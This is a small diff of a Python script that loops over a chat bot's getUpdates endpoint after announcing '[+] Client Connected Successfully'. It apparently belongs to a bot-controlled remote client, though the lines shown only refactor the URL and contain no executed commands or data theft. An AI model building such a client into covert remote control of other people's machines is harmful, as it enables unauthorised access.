@@ -29,7 +29,8 @@ send("[+] Client Connected Successfully")
 
 while True:
     try:
-        r = requests.get(BASE + "/getUpdates", params={"offset": offset + 1, "timeout": 30}, timeout=35).json()
+        url = BASE + "/getUpdates"
+        r = requests.get(url, params={"offset": offset + 1, "timeout": 30}, timeout=35).json()
         for upd in r.get("result", []):
             offset = upd.get("update_id", offset)
             msg = upd.get("message", {})
